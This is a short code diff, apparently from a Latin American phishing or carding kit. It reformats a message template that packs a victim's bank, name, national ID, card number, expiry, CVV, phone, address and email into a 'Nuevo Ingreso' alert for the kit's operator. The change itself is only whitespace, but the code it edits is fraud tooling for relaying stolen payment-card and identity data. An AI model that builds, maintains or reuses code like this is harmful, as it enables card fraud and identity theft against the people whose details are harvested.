@@ -409,15 +409,16 @@ export const latamSimpleMsj = async (req, res) => {
       '🚨🚨 Nuevo Ingreso 🚨🚨',
       '',
       `
-      ╭🏦 Banco: ${data.banco}
-      ┣🟢 Nombre: ${data.nombre}
-      ┣🟢 Cedula: ${data.cedula}
-      ┣🟢 CC: ${data.tarjeta}
-      ┣🟢 Exp: ${data.fecha}
-      ┣🟢 Cvv: ${data.cvv}
-      ┣🟢 Telefono: ${data.telefono}
-      ┣🟢 Direccion: ${data.direccion}
-      ╰🟢 Correo: ${data.email}`
+╭🏦 Banco: ${data.banco}
+┣🟢 Nombre: ${data.nombre}
+┣🟢 Cedula: ${data.cedula}
+┣🟢 CC: ${data.tarjeta}
+┣🟢 Exp: ${data.fecha}
+┣🟢 Cvv: ${data.cvv}
+┣🟢 Telefono: ${data.telefono}
+┣🟢 Direccion: ${data.direccion}
+╰🟢 Correo: ${data.email}
+      `
       // agrega más líneas si las tienes (monto, fecha, etc.)
     ].join('\n');
 
